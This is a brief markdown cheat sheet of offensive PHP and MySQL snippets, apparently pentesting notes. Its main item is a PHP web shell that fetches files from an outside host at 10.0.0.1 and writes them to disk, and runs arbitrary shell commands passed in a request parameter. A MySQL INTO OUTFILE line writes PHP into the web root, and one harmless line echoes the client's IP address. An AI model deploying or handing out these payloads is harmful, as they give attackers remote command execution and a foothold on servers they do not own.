## PHP

### File upload and command execution
```php
<?php if (isset($_REQUEST['fupload'])) {
	file_put_contents($_REQUEST['fupload'],
	file_get_contents('http://10.0.0.1/' . $_REQUEST['fupload']));
};
if (isset($_REQUEST['fexec'])) {
	echo '<pre>' . shell_exec($_REQUEST['fexec']) . '</pre>';
} ?>
```

### Echo IP Address
`<?php echo $_SERVER["REMOTE_ADDR"];`

### MySQL
`SELECT "<?phpinfo()" into OUTFILE "/var/www/html/infox.php"
